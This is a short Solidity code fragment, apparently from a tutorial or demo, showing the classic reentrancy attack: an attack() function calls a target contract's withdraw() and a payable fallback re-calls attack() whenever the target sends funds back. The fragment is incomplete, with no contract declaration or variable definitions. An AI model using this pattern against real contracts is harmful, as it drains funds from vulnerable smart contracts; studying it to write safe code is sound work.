  function attack() public {
    target.call(bytes4(keccak256("withdraw()")),amount);
  }


  function() payable public {
    if (msg.sender == target) {
        attack();
        }
  }
